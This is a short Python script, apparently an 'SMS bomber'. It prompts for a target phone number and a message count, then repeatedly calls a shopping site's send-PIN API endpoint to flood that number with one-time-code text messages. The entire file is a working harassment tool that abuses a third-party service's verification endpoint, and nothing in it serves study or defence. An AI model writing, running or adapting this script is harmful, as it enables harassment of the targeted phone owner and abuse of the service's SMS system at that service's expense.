# Imports
import requests
import time

# Static variables
base_url = "https://api.torob.com/a/phone/send-pin/?phone_number="

# App
number = input('Please enter target number: ')
length = input('Please enter number of sms: ')
if number.isnumeric() and length.isnumeric():
    number = int(number)
    length = int(length)
else:
    print(f"Number or length aren't numeric")
    exit()

for i in range(0,length,1):
    request = requests.get(f"{base_url}{number}")
    if request.status_code == 200:
        print(f'#{i}: SMS sent')
    else:
        print(f'#{i}: SMS failed')
    time.sleep(3)
print('BYE ;)')